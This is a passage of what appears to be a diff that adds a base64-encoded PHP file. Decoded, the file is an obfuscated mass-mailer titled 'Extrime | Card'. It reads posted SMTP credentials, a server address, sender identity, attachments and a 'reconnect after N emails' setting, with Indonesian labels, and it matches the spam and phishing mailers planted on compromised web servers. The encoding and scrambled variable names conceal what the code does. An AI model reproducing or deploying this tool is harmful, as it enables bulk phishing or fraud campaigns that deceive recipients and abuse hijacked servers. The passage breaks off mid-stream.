+KXsKCSR4MTIgPSAnJzsgCglmb3JlYWNoICgkeDExIGFzICR4MTMgPT4gJHgxNCkgewoJJHgxMiAu
+PSAoc3RybGVuKCR4MTIpIDwgMSkgPyAnJyA6ICcmJzsKCSR4MTIgLj0gJHgxMyAuICc9JyAuIHJh
+d3VybGVuY29kZSgkeDE0KTsKCX0KCXJldHVybiAoJHgxMik7Cgl9CglmdW5jdGlvbiBscnRyaW0o
+JHgxNSl7CglyZXR1cm4gc3RyaXBzbGFzaGVzKGx0cmltKHJ0cmltKCR4MTUpKSk7Cgl9CglpZihp
+c3NldCgkX1BPU1RbJ2FjdGlvbiddICkgKXsKCgkkeDE2ID0gcXVlcnlfc3RyKCRfUE9TVCk7Cglw
+YXJzZV9zdHIoJHgxNik7ICAKCSR4MTc9bHJ0cmltKCR4MTcpOyAgCgkkeDE4PWxydHJpbSgkeDE4
+KTsKCSR4MTk9bHJ0cmltKCR4MTkpOwoJJHgxYT1scnRyaW0oJHgxYSk7CgkkeDFiPWxydHJpbSgk
+eDFiKTsKCSR4MWM9bHJ0cmltKCR4MWMpOwoJJHgxZD1scnRyaW0oJHgxZCk7CgkkeDFlPWxydHJp
+bSgkeDFlKTsKCSR4MWY9bHJ0cmltKCR4MWYpOwoJJHgyMD1scnRyaW0oJHgyMCk7CgkkeDIxPWxy
+dHJpbSgkeDIxKTsKCSR4MjI9bHJ0cmltKCR4MjIpOwoJJHgyMz1scnRyaW0oJHgyNCk7CgkkeDI1
+PWxydHJpbSgkeDI2KTsKCSR4Mjc9JHgyOFsnZmlsZSddWyduYW1lJ107CgkkeDI5PSR4MjhbJ2Zp
+bGUnXVsndG1wX25hbWUnXTsKCSR4MmE9bHJ0cmltKCR4MmEpOwoJJHgyYj1scnRyaW0oJHgyYik7
+CgkkeDJjPSRfUE9TVFsnZW5jb2RlJ107CgoKCQkJJHgxOSA9IHVybGVuY29kZSgkeDE5KTsKCQkJ
+JHgxOSA9IGVyZWdfcmVwbGFjZSgiJTVDJTIyIiwgIiUyMiIsICR4MTkpOwoJCQkkeDE5ID0gdXJs
+ZGVjb2RlKCR4MTkpOwoJCQkkeDE5ID0gc3RyaXBzbGFzaGVzKCR4MTkpOwoJCQkkeDI0ID0gc3Ry
+aXBzbGFzaGVzKCR4MjQpOwoJCQlpZiAoJHgyYyA9PSAieWVzIikgewoJCQkkeDI0ID0gcHJlZ19y
+ZXBsYWNlKCcvKFteYS16IF0pL2llJywgJ3NwcmludGYoIj0lMDJ4IixvcmQoU3RyaXBTbGFzaGVz
+KCJcXDEiKSkpJywgJHgyNCk7CgkJCSR4MjQgPSBzdHJfcmVwbGFjZSgnICcsICdfJywgJHgyNCk7
+CgkJCSR4MjQgPSAiPT9VVEYtOD9RPyR4MjQ/PSI7CgkJCSR4MjYgPSBwcmVnX3JlcGxhY2UoJy8o
+W15hLXogXSkvaWUnLCAnc3ByaW50ZigiPSUwMngiLG9yZChTdHJpcFNsYXNoZXMoIlxcMSIpKSkn
+LCAkeDI2KTsKCQkJJHgyNiA9IHN0cl9yZXBsYWNlKCcgJywgJ18nLCAkeDI2KTsKCQkJJHgyNiA9
+ICI9P1VURi04P1E/JHgyNj89IjsKCQkJfQoJfQoJPz4KCgk8aHRtbD4KCgk8aGVhZD4KCTxsaW5r
+IHJlbD0iU0hPUlRDVVQgSUNPTiIgaHJlZj0iaHR0cDovL2k0OC5zZXJ2aW1nLmNvbS91L2Y0OC8x
+Ni8wOC8wNy83NC9pbmRvbmUxMC5naWYiPgoJPHRpdGxlPiA+LXxJfC0+IEV4dHJpbWUgfCAgQ2Fy
+ZCA8LXxJfC08IDwvdGl0bGU+CgoJPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250
+ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9aXNvLTg4NTktMSI+CgoJPHNjcmlwdCBzcmM9J2h0dHA6
+Ly9zdGF0aWMudHVtYmxyLmNvbS9xbzBnb256L0pzSm4wZ2loeS9qcXVlcnktMS42LjIuanMnPjwv
+c2NyaXB0PgoJIDxzdHlsZT4KCWJvZHksdGFibGV7YmFja2dyb3VuZDogIDsgZm9udC1mYW1pbHk6
+VmVyZGFuYSx0YWhvbWE7IGNvbG9yOiBEYXJrdmlvbGV0IDsgZm9udC1zaXplOjEwcHggfQoJQTps
+aW5rIHt0ZXh0LWRlY29yYXRpb246IG5vbmU7Y29sb3I6IGFxdWE7fQoJQTphY3RpdmUge3RleHQt
+ZGVjb3JhdGlvbjogbm9uZTtjb2xvcjogYXF1YTt9CglBOnZpc2l0ZWQge3RleHQtZGVjb3JhdGlv
+bjogbm9uZTtjb2xvcjogbGltZTt9CglBOmhvdmVyIHt0ZXh0LWRlY29yYXRpb246IHVuZGVybGlu
+ZTsgY29sb3I6IEZ1Y2hzaWE7fQoJI25ldyxpbnB1dCx0YWJsZSx0ZCx0ciwjZ2d7Ym9yZGVyLXN0
+eWxlOnNvbGlkO3RleHQtZGVjb3JhdGlvbjpib2xkIDt9CglpbnB1dDpob3Zlcix0cjpob3Zlcix0
+ZDpob3ZlcntiYWNrZ3JvdW5kLWNvbG9yOiAgOyBjb2xvcjogYXF1YTt9Cgk8L3N0eWxlPgoJPHN0
+eWxlIHR5cGU9InRleHQvY3NzIj4KCTwhLS0KCS5zdHlsZTEgewoJCQlmb250LWZhbWlseTogR2Vu
+ZXZhLCBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmOwoJCQlmb250LXNpemU6IDEycHg7Cgl9
+Cglib2R5ewoJbWFyZ2luOjBweDsKCX0KCS5iZ3VwIHsKCWJhY2tncm91bmQ6IHVybChkYXRhOmlt
+YWdlL2dpZjtiYXNlNjQsUjBsR09EbGhNZ0FxQUxNTEFCY1hGeVltSmpBd01CMGRIU0FnSUJvYUdo
+a1pHUlFVRkNRa0pCd2NIQUFBQVAvLy93QUFBQUFBQUFBQUFBQUFBQ0grQTBjME5BQWgvd3RPUlZS
+VFEwRlFSVEl1TUFNQkFBQUFJZmtFQlFvQUN3QXNBQUFBQURJQUtnQUFCUDlReVVtcnZUamJrNDRz
+U0NFbHljUjVDb0tZM1JlNm9uSks2bVFvdDBMb1V5bmR1WlFOSjludGVFZmdaRFZTK0ZaTVowOUtt
+ejZGUW1iSmh5WG1qTk1mc1NyKzhwRGxKUXNGaWlVQ0FNa3NKUmpJVzRvMjdJNUNDRFNBZ1lLRGhJ
+V0JOU05jYzNveWVITWtFNHlQWEYxVVhrVm5TcGRObUVsamxwVmNXMVZhVktPY1dVMmlGRkdXbW1D
+Ym1wYXdzbHgrZGs1d2ZIdU5LSSs2ZVMrOUl3R0d4c2ZJeVJpVFMxR1F1eWxSYzR2Q2M3V3NGRnl5
+VVpxdm1XT25vSzJydGxhcXBPZWI0dGxEUWR4ajNwNDV2M0YwdUcvMWM3ZlExREVjeWdBRENzd2dD
+Yyt6WURFS29qZzREUThqV3ArNHdJSVlSQnU4TWJDZ3BMT2tNWldVVmVtQVRuV2tHQWFOeVd0cE5z
+RlNTS3dlSTVhNThqbHkyR3Fnelp2R0dPSkJOS3duVDJiUWVMcjY5QzdIdG5ZbGo1WU01OHdVUjNP
+b21MSkwyYVViVWFTb2xNWU1Xb2ZmenE0OThYSEZTYmFzb0lNdzlVVkp1MU1hbmxuZmpGN3RsRkly
+U28rbnBLTDd1TEVweUpNWDNVMGdxYTVvUzE0Tis0QmxxeGpYUDdQSElnQUFJZmtFQlFvQUN3QXNB
+UUFCQURBQUtBQUFCUDh3SlVVUlVpdnJ2ZFJKWENodWlrUk5sSEpSaG1LRXJndVhvM2ltYWpxQlhF
+bjN2MXJHUjZ5a1dxOGVjc1lUYWtvQmdMTjNtRnF2Mkt4Mnk5MThEcFFDb2tENVZsWUtNZG1UQUxQ
+ZGx0U1h0QlFhWVhWU2ppVjc3bUE3S1JlQVFVOTdQazBkZVNOM1NuMTZhRWdKVVdWdFlXT1ZjQUlE
+bDJ0bWJ4V2JYYU9rcFZjcWFITWhZbGxuY3BZbEtKR1BUd1FZV0lLM2VySTZoVU9EdUkyN1JueEpK
+TGF0d29ZVENKdGxwaVRObkcvUTFkYlhDeE1pSnBrbktHbGpyUzAzVExyTEtiWUVyZC9hUU8zRFJn
+aml2ZVhsRk9sWnNKTlRIdGorL3dCWGhldWh4dHNyTndYbUdiTnlveGdlYzRRUzhTdnlwOGM3RzRz
+bWZzdW9DQ0lWV0FVOW9RRG9kSUlTdFlBb1UxN0JCQ3BXaXBBZnRMUlVnOCtkeHhnTGgvaDRPQzdk
+QlhrMkk5YXpTT1JueldFOGg5S2hGZUxUcEpIZ1BFbDAwaTFxQkFBaCtRUUZDZ0FMQUN3QkFBRUFN
+QUFvQUFBRS83Q2dzcXE5T091ZEVWSUVxQ2dHT1NxSmtvM2ZTbkNhOG4xb1BhYXJyR0k2ekljaFUr
+bTJ1N0NLRnBCdnlXdzZuOUNvZEVyRkhCS0hXMm9rS1doUDE2ek1kMXlWaHJYY1ZuaEN3TXE4MUJy
+SHM5WFdiZzdjZUQ3UmpYWjllMDhLVnh0ZE53RUFJMkVzVlkrUWtVMk5oVmdzTkpVeGlDaC9aSUtD
+T2lObkxpSkVvaVI2Y2tSNGZpZ3JNNjJyZXA4bVI2Y0dwRUdCSkFrQk1aU1VDQUlEakFtU3g4akpW
+VjFMQ2NaU1FybG10YTdRY3E5amNYYWRTNldqUDBvOG9NL0s1ZWJuNkJkcmhpdVVteDVJYjNhN3VP
+S29kUzFNcHZ2WDJ1UkpQZlROVy9PTnp6MUErWlI1cVNUbW5ZQjBFQ05XS0NiR1did0ZNakJSc2tn
+b3pMaUxneDhtMHROblFCV1JIQWtCenFsbUJOYWRqeWhCam5SaUNZVWlGc1BNaFlrQUFDSDVCQVVL
+QUFzQUxBRUFBUUF3QUNnQUFBVC9NQ1cxcWwwRjNjMlhVbG9uZnRPbmxBcVJjb3JSc2lBbGJxUjVt
+Z2pJVGdtY3o3U2JDYVVpc0Z3R0gzREpiRHFmMEtoMDJ2d2NFb2RQcHZCQi9KaFlFbXFyUlhBVjE0
+T0xXbW01YTUvaXNjVmozMUNvWE9oeVg5dVJReVp5TkVocFpXY0lBbXdkVzR1T2o1Q1JDZ1ZWWGpK
+T2J6Y3NSWUUrSm9CZFFEVXNlcDFCT1RWNW9wbzBuS09ubjVsNlVGbVRqNG1SdWJxN095aHBVRHBV
+cjN3cVRGMlhsYVo4czZ0Zm1DckRGaW5JSXpHOFQzdlgydHNiWVdqZWhpRFowdUhobGxaWWZIN04x
+QjZnb0RFZlNId1R4dFkwUEtrNGdUM1M2elBINXJod016QWV3VVFEME5VcTV3MFhDNGExRUZyaFJy
+R2l4WXNZTSs1S1FRYUVvb3RtQWlJQUFEcz0pOwoJfQoKCgkudWlidXR0b24geyAKCQlwb3NpdGlv
+bjogcmVsYXRpdmU7IAoJCXotaW5kZXg6IDE7CgkJb3ZlcmZsb3c6IHZpc2libGU7IAoJCWRpc3Bs
+YXk6IGlubGluZS1ibG9jazsgCgkJcGFkZGluZzogMC4zZW0gMC42ZW0gMC4zNzVlbTsgCgkJYm9y
+ZGVyOiAxcHggc29saWQgTGltZTsgCgkJYm9yZGVyLWJvdHRvbS1jb2xvcjogTGltZTsKCQkKCQlt
+YXJnaW46IDA7CgkJdGV4dC1kZWNvcmF0aW9uOiBub25lOyAKCQl0ZXh0LWFsaWduOiBjZW50ZXI7
+CgkJZm9udDogYm9sZCAxMXB4L25vcm1hbCAnbHVjaWRhIGdyYW5kZScsIHRhaG9tYSwgdmVyZGFu
+YSwgYXJpYWwsIHNhbnMtc2VyaWY7IAoJCXdoaXRlLXNwYWNlOiBub3dyYXA7IAoJCWN1cnNvcjog
+cG9pbnRlcjsgCgkJLyogb3V0bGluZTogbm9uZTsgKi8KCQljb2xvcjogI2Y5ZjlmOTsgCgkJYmFj
+a2dyb3VuZC1jb2xvcjogI2VlZTsKCQliYWNrZ3JvdW5kLWltYWdlOiAtd2Via2l0LWdyYWRpZW50
+KGxpbmVhciwgMCAwLCAwIDEwMCUsIGZyb20oTGltZSksIHRvKExpbWUpKTsKCQliYWNrZ3JvdW5k
+LWltYWdlOiAtbW96LWxpbmVhci1ncmFkaWVudChMaW1lLCBMaW1lKTsKCQliYWNrZ3JvdW5kLWlt
+YWdlOiAtby1saW5lYXItZ3JhZGllbnQoTGltZSwgTGltZSk7CgkJYmFja2dyb3VuZC1pbWFnZTog
+bGluZWFyLWdyYWRpZW50KExpbWUsIExpbWUpOwoKCQkvKiBJRSBoYWNrcyAqLwoKCQkqZGlzcGxh
+eTogaW5saW5lOyAKCgl9CgoJLnVpYnV0dG9uOmhvdmVyLAoJLnVpYnV0dG9uOmZvY3VzLAoJLnVp
+YnV0dG9uOmFjdGl2ZSB7CgkJYm9yZGVyLWNvbG9yOiBMaW1lIExpbWUgTGltZSBMaW1lOwoJfQoK
+CS51aWJ1dHRvbjphY3RpdmUgewoJCWJvcmRlci1jb2xvcjogTGltZTsKCQliYWNrZ3JvdW5kOiBM
+aW1lOwoJCWZpbHRlcjogbm9uZTsKCQktd2Via2l0LWJveC1zaGFkb3c6IG5vbmU7CgkJLW1vei1i
+b3gtc2hhZG93OiBub25lOwoJCWJveC1zaGFkb3c6IG5vbmU7Cgl9CgoJLyogb3ZlcnJpZGVzIGV4
+dHJhIHBhZGRpbmcgb24gYnV0dG9uIGVsZW1lbnRzIGluIEZpcmVmb3ggKi8KCS51aWJ1dHRvbjo6
+LW1vei1mb2N1cy1pbm5lciB7CgkJcGFkZGluZzogMDsKCQlib3JkZXI6IDA7Cgl9CgoKCgktLT4K
+CTwvc3R5bGU+Cgk8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgoJPCEtLQoJLnN0eWxlMSB7CgkJCWZv
+bnQtc2l6ZTogMTBweDsKCQkJZm9udC1mYW1pbHk6IEdlbmV2YSwgQXJpYWwsIEhlbHZldGljYSwg
+c2Fucy1zZXJpZjsKCQkJYm9keSx0YWJsZXtiYWNrZ3JvdW5kOiAgOyBmb250LWZhbWlseTpWZXJk
+YW5hLHRhaG9tYTsgY29sb3I6IERhcmt2aW9sZXQgOyBmb250LXNpemU6MTBweCB9CglBOmxpbmsg
+e3RleHQtZGVjb3JhdGlvbjogbm9uZTtjb2xvcjogYXF1YTt9CglBOmFjdGl2ZSB7dGV4dC1kZWNv
+cmF0aW9uOiBub25lO2NvbG9yOiBhcXVhO30KCUE6dmlzaXRlZCB7dGV4dC1kZWNvcmF0aW9uOiBu
+b25lO2NvbG9yOiBsaW1lO30KCUE6aG92ZXIge3RleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOyBj
+b2xvcjogRnVjaHNpYTt9CgkjbmV3LGlucHV0LHRhYmxlLHRkLHRyLCNnZ3tib3JkZXItc3R5bGU6
+c29saWQ7dGV4dC1kZWNvcmF0aW9uOmJvbGQgO30KCWlucHV0OmhvdmVyLHRyOmhvdmVyLHRkOmhv
+dmVye2JhY2tncm91bmQtY29sb3I6ICA7IGNvbG9yOiBhcXVhO30KCX0KCS0tPgoJPC9zdHlsZT4K
+CTwvaGVhZD4KCTxib2R5IGJnY29sb3I9IiNmOWY5ZjkiIGNsYXNzPSJiZ3VwIj4KCTxkaXYgY2xh
+c3M9ImNhZHJlIiBzdHlsZT0iaGVpZ2h0OjEwcHg7bWFyZ2luOjBweCBhdXRvOyI+PC9kaXY+Cgk8
+ZGl2IHN0eWxlPSJ3aWR0aDo4MCU7bWFyZ2luOjAgYXV0bzsiPgoJPHAgYWxpZ249ImNlbnRlciI+
+PGZvbnQgc2l6ZT0iNSIgZmFjZT0iQmF1aGF1cyA5MyI+ID4tfEl8LT4gRXh0cmltZSB8ICBDYXJk
+IDwtfEl8LTwgPC9mb250PjwvcD4KCTxmb3JtIG5hbWU9ImZvcm0xIiBtZXRob2Q9InBvc3QiIGFj
+dGlvbj0iIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4KCgkgIDxicj4KCTxjZW50ZXI+
+PHRhYmxlIHN0eWxlPSJiYWNrZ3JvdW5kOiMiIGJvcmRlcj0iMSI+PHRyPgoJPHRoIHN0eWxlPSJi
+YWNrZ3JvdW5kOmJsaW5rOyI+IAoJICA8dGFibGUgd2lkdGg9IjEwMCUiIGJvcmRlcj0iMCIgaGVp
+Z2h0PSI0MDciIHN0eWxlPSJiYWNrZ3JvdW5kOiNmZmYiIGNlbGxwYWRkaW5nPSIwIiBjZWxsc3Bh
+Y2luZz0iMCI+CgoJCTx0cj4KCgkJICA8dGQgd2lkdGg9IjEwMCUiIGNvbHNwYW49IjQiICBzdHls
+ZT0iY29sb3I6I2ZmZjtiYWNrZ3JvdW5kOkRhcmt2aW9sZXQiIGhlaWdodD0iMzYiPgoKCQkJPGI+
+CgoJCQk8Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0iMiIgPiZuYnNwO1NNVFAgU0VUSU5HPC9mb250
+PjwvYj48L3RkPgoKCQkgIDwvdHI+CgkJPHRyID4KCgkJICA8dGQgd2lkdGg9IjEwJSIgaGVpZ2h0
+PSIyMiIgc3R5bGU9InBhZGRpbmc6MTBweDsiPgoJICAgCgkJCTxkaXYgYWxpZ249InJpZ2h0Ij48
+Zm9udCBzaXplPSItMyIgZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJp
+ZiI+U01UUCBMb2dpbjo8L2ZvbnQ+PC9kaXY+CgoJCSAgPC90ZD4KCgkJICA8dGQgd2lkdGg9IjE4
+JSIgaGVpZ2h0PSIyMiIgc3R5bGU9InBhZGRpbmc6MTBweDsiPjxmb250IHNpemU9Ii0zIiBmYWNl
+PSJWZXJkYW5hLCBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmIj4KCgkJCTxpbnB1dCB0eXBl
+PSJ0ZXh0IiBzdHlsZT0iYmFja2dyb3VuZDojRUZGQkY4O2JvcmRlcjogMXB4IHNvbGlkIExpbWU7
+Y29sb3I6IzMzMyIgbmFtZT0ic210cF91c2VybmFtZSIgdmFsdWU9Ijw/PSR4MjA7Pz4iIHNpemU9
+IjMwIj4KCgkJCTwvZm9udD48L3RkPgoKCQkgIDx0ZCB3aWR0aD0iMzElIiBoZWlnaHQ9IjIyIiBz
+dHlsZT0icGFkZGluZzoxMHB4OyI+CgoJCQk8ZGl2IGFsaWduPSJyaWdodCI+PGZvbnQgc2l6ZT0i
+LTMiIGZhY2U9IlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWYiPlNNVFAgUGFz
+czo8L2ZvbnQ+PC9kaXY+CgoJCSAgPC90ZD4KCgkJICA8dGQgd2lkdGg9IjQxJSIgaGVpZ2h0PSIy
+MiIgc3R5bGU9InBhZGRpbmc6MTBweDsiPjxmb250IHNpemU9Ii0zIiBmYWNlPSJWZXJkYW5hLCBB
+cmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmIj4KCgkJCTxpbnB1dCB0eXBlPSJwYXNzd29yZCIg
+c3R5bGU9ImJhY2tncm91bmQ6I0VGRkJGODtib3JkZXI6IDFweCBzb2xpZCBMaW1lO2NvbG9yOiMz
+MzMiIG5hbWU9InNtdHBfcGFzc3dvcmQiIHZhbHVlPSI8Pz0keDIxOz8+IiBzaXplPSIzMCI+CgoJ
+CQk8L2ZvbnQ+PC90ZD4KCgkJPC90cj4KCQk8dHI+CgoJCSAgPHRkIHdpZHRoPSIxMCUiIGhlaWdo
+dD0iMjIiIHN0eWxlPSJwYWRkaW5nOjEwcHg7Ij4KCgkJCTxkaXYgYWxpZ249InJpZ2h0Ij4KCQkJ
+ICA8Zm9udCBmYWNlPSJWZXJkYW5hLCBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmIiBzaXpl
+PSItMyI+UG9ydCA6PC9mb250PjwvZGl2PgoKCQkgIDwvdGQ+CgoJCSAgPHRkIHdpZHRoPSIxOCUi
+IGhlaWdodD0iMjIiIHN0eWxlPSJwYWRkaW5nOjEwcHg7Ij48Zm9udCBzaXplPSItMyIgZmFjZT0i
+VmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiI+CgoJCQk8aW5wdXQgdHlwZT0i
+dGV4dCIgc3R5bGU9ImJhY2tncm91bmQ6I0VGRkJGODtib3JkZXI6IDFweCBzb2xpZCBMaW1lO2Nv
+bG9yOiMzMzMiIG5hbWU9InNzbF9wb3J0IiB2YWx1ZT0iPD89JHgxZjs/PiIgc2l6ZT0iNSI+IAoJ
+CSAgKG9wdGlvbmFsKTwvZm9udD48L3RkPgoKCQkgIDx0ZCB3aWR0aD0iMzElIiBoZWlnaHQ9IjIy
+IiBzdHlsZT0icGFkZGluZzoxMHB4OyI+CgoJCQk8ZGl2IGFsaWduPSJyaWdodCI+CgkJCSAgPGZv
+bnQgZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiIgc2l6ZT0iLTMi
+PlNNVFAgU2VydmVyIAoJCQkgIFNtdHA6PC9mb250PjwvZGl2PgoKCQkgIDwvdGQ+CgoJCSAgPHRk
+IHdpZHRoPSI0MSUiIGhlaWdodD0iMjIiIHN0eWxlPSJwYWRkaW5nOjEwcHg7Ij48Zm9udCBzaXpl
+PSItMyIgZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiI+CgoJCQk8
+aW5wdXQgdHlwZT0idGV4dCIgc3R5bGU9ImJhY2tncm91bmQ6I0VGRkJGODtib3JkZXI6IDFweCBz
+b2xpZCBMaW1lO2NvbG9yOiMzMzMiIG5hbWU9Im15X3NtdHAiIHZhbHVlPSI8Pz0keDFlOz8+IiBz
+aXplPSIzMCI+CgoJCQk8L2ZvbnQ+PC90ZD4KCgkJPC90cj4KCQk8dHI+CgoJCSAgPHRkIHdpZHRo
+PSIxMCUiIGhlaWdodD0iMjIiIHN0eWxlPSJwYWRkaW5nOjEwcHg7Ij4KCgkJCTxwIGFsaWduPSJy
+aWdodCI+CgkJCTxmb250IGZhY2U9IlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2Vy
+aWYiIHNpemU9Ii0zIj5TU0wgU2VydmVyOjwvZm9udD48L3RkPgoKCQkgIDx0ZCB3aWR0aD0iMTgl
+IiBoZWlnaHQ9IjIyIiBzdHlsZT0icGFkZGluZzoxMHB4OyI+CgkJICA8aW5wdXQgdHlwZT0iY2hl
+Y2tib3giIHN0eWxlPSJiYWNrZ3JvdW5kOiNFRkZCRjg7Ym9yZGVyOiAxcHggc29saWQgTGltZTtj
+b2xvcjojMzMzIiBuYW1lPSJzc2xjbGljayIgdmFsdWU9Ik9OIiA8PyBpZigkeDE3KXsgcHJpbnQg
+ImNoZWNrZWQiOyB9ID8+ID48Zm9udCBzaXplPSItMyIgZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhl
+bHZldGljYSwgc2Fucy1zZXJpZiI+KHllcyk8L2ZvbnQ+PC90ZD4KCgkJICA8dGQgd2lkdGg9IjMx
+JSIgaGVpZ2h0PSIyMiIgc3R5bGU9InBhZGRpbmc6MTBweDsiPgoKCQkJPHAgYWxpZ249InJpZ2h0
+Ij4KCQkJPGZvbnQgZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiIg
+c2l6ZT0iLTMiPlJlY29ubmVjdCAKCQkJQWZ0ZXI6PC9mb250PjwvdGQ+CgoJCSAgPHRkIHdpZHRo
+PSI0MSUiIGhlaWdodD0iMjIiIHN0eWxlPSJwYWRkaW5nOjEwcHg7Ij48Zm9udCBzaXplPSItMyIg
+ZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiI+CgoJCQk8aW5wdXQg
+dHlwZT0idGV4dCIgc3R5bGU9ImJhY2tncm91bmQ6I0VGRkJGODtib3JkZXI6IDFweCBzb2xpZCBM
+aW1lO2NvbG9yOiMzMzMiIG5hbWU9InJlY29ubmVjdCIgdmFsdWU9Ijw/PSR4MWM7Pz4iIHNpemU9
+IjUiPiAKCQkgIEVNQUlMUzwvZm9udD48L3RkPgoKCQk8L3RyPgoJCTx0cj4KCgkJICA8dGQgd2lk
+dGg9IjEwMCUiIGhlaWdodD0iMzkiICBjb2xzcGFuPSI0IiBzdHlsZT0icGFkZGluZzoxMHB4OyI+
+CgoJCQk8cCBhbGlnbj0iY2VudGVyIj4KCQkJPGZvbnQgZmFjZT0iQXJpYWwiIHN0eWxlPSJmb250
+LXNpemU6IDlwdCIgY29sb3I9IkRhcmt2aW9sZXQiPjxiPiBKaWthIEFuZGEgdGlkYWsgbWVtaWxp
+a2kgU01UUCBsb2dpbiAgS29zb25na2FuIHBlcnRhbnlhYW4gZGkgYXRhcyA8L2I+PC9mb250Pjwv
+dGQ+CgoJCSAgPC90cj4KCgkJPHRyPgoKCQkgIDx0ZCB3aWR0aD0iMTAlIiBoZWlnaHQ9IjE5IiBz
+dHlsZT0icGFkZGluZzoxMHB4OyI+CgoJCQkmbmJzcDs8L3RkPgoKCQkgIDx0ZCB3aWR0aD0iMTgl
+IiBoZWlnaHQ9IjE5IiBzdHlsZT0icGFkZGluZzoxMHB4OyI+Jm5ic3A7PC90ZD4KCgkJICA8dGQg
+d2lkdGg9IjMxJSIgaGVpZ2h0PSIxOSIgc3R5bGU9InBhZGRpbmc6MTBweDsiPgoKCQkJJm5ic3A7
+PC90ZD4KCgkJICA8dGQgd2lkdGg9IjQxJSIgaGVpZ2h0PSIxOSIgc3R5bGU9InBhZGRpbmc6MTBw
+eDsiPiZuYnNwOzwvdGQ+CgoJCTwvdHI+CgoJCTx0cj4KCgkJICA8dGQgd2lkdGg9IjEwMCUiIGNv
+bHNwYW49IjQiIHN0eWxlPSJjb2xvcjojZmZmO2JhY2tncm91bmQ6RGFya3Zpb2xldCIgaGVpZ2h0
+PSIzNiI+CgoJCQk8Yj4KCgkJCTxmb250IGZhY2U9IkFyaWFsIiBzaXplPSIyIiBjb2xvcj0iI0ZG
+RkZGRiI+Jm5ic3A7TUVTU0FHRSBTRVRJTkc8L2ZvbnQ+PC9iPjwvdGQ+CgoJCSAgPC90cj4KCQkJ
+ICA8dHI+CgoJCSAgPHRkIHdpZHRoPSIxMCUiIGhlaWdodD0iMjIiIHN0eWxlPSJwYWRkaW5nOjEw
+cHg7Ij4KCQkJPGRpdiBhbGlnbj0icmlnaHQiPjxmb250IHNpemU9Ii0zIiBmYWNlPSJWZXJkYW5h
+LCBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmIj5BdHRhY2ggRmlsZSA6PC9mb250PjwvZGl2
+PgoJCSAgPC90ZD4KCgkJICA8dGQgd2lkdGg9IjU5JSIgaGVpZ2h0PSIyMiIgc3R5bGU9InBhZGRp
+bmc6MTBweDsiICBjb2xTcGFuPSIzIj4KCQkgIDxmb250IHNpemU9Ii0zIiBmYWNlPSJWZXJkYW5h
+LCBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmIj4KCgk8aW5wdXQgdHlwZT0iZmlsZSIgc3R5
+bGU9ImJhY2tncm91bmQ6I0VGRkJGODs7Ym9yZGVyOiAxcHggc29saWQgTGltZTtjb2xvcjojMzMz
+IiBuYW1lPSJmaWxlIiBzaXplPSIxMjQiPgoKCQkJPC9mb250PjwvdGQ+CgoJCTwvdHI+CgkJPHRy
+PgoKCQkgIDx0ZCB3aWR0aD0iMTAlIiBoZWlnaHQ9IjIyIiBzdHlsZT0icGFkZGluZzoxMHB4OyI+
+CgoJCQk8ZGl2IGFsaWduPSJyaWdodCI+PGZvbnQgc2l6ZT0iLTMiIGZhY2U9IlZlcmRhbmEsIEFy
+aWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWYiPgoKCQkJICBFbWFpbCBBbmRhOjwvZm9udD48L2Rp
+dj4KCgkJICA8L3RkPgoKCQkgIDx0ZCB3aWR0aD0iMTglIiBoZWlnaHQ9IjIyIiBzdHlsZT0icGFk
+ZGluZzoxMHB4OyI+PGZvbnQgc2l6ZT0iLTMiIGZhY2U9IlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRp
+Y2EsIHNhbnMtc2VyaWYiPgoKCQkJPGlucHV0IHR5cGU9InRleHQiIHN0eWxlPSJiYWNrZ3JvdW5k
+OiNFRkZCRjg7O2JvcmRlcjogMXB4IHNvbGlkIExpbWU7Y29sb3I6IzMzMyIgbmFtZT0iZnJvbSIg
+dmFsdWU9Ijw/PSR4MWI7Pz4iIHNpemU9IjMwIj4KCgkJCTwvZm9udD48L3RkPgoKCQkgIDx0ZCB3
+aWR0aD0iMzElIiBoZWlnaHQ9IjIyIiBzdHlsZT0icGFkZGluZzoxMHB4OyI+CgoJCQk8ZGl2IGFs
+aWduPSJyaWdodCI+PGZvbnQgc2l6ZT0iLTMiIGZhY2U9IlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRp
+Y2EsIHNhbnMtc2VyaWYiPgoKCQkJICBOYW1hIEFuZGE6PC9mb250PjwvZGl2PgoKCQkgIDwvdGQ+
+CgoJCSAgPHRkIHdpZHRoPSI0MSUiIGhlaWdodD0iMjIiIHN0eWxlPSJwYWRkaW5nOjEwcHg7Ij48
+Zm9udCBzaXplPSItMyIgZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJp
+ZiI+CgoJCQk8aW5wdXQgdHlwZT0idGV4dCIgc3R5bGU9ImJhY2tncm91bmQ6I0VGRkJGODs7Ym9y
